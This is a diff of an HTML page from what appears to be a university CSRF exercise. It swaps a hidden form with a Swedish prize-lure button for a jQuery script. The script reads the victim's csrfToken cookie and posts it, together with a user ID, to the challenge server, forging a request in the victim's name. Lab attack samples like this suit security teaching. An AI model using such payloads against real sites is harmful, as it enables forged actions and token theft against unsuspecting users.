@@ -1,5 +1,34 @@
-<form name="leForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">
-    <input type="hidden" name="userId" value=" 86109c9eed773b92480275854966986d3c4901a6" />
-    <input type="submit" value="Klicka här och vinn tiotusenmiljarder kr"/>
-</form>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script>
+    function getCookie(cname) {
+        <!-- 
+        Hämtad från: https://www.w3schools.com/js/js_cookies.asp
+        -->
+        var name = cname + "=";
+        var decodedCookie = decodeURIComponent(document.cookie);
+        var ca = decodedCookie.split(';');
+        for(var i = 0; i <ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0) == ' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) == 0) {
+                return c.substring(name.length, c.length);
+            }
+        }
+        return "";
+    }
+
+    $.ajax({
+	    dataType: "text",
+	    type: "POST",
+	    url: "https://snickerboa.it.liu.se/challenges/z311736498a13604705d608fb3171ebf49bc18753b0ec34b8dff5e4f9147eb5e",
+	    data: {
+		    userId: "86109c9eed773b92480275854966986d3c4901a6",
+		    csrfToken: getCookie("csrfToken")
+	    },
+        async: false
+    });
+</script>
 
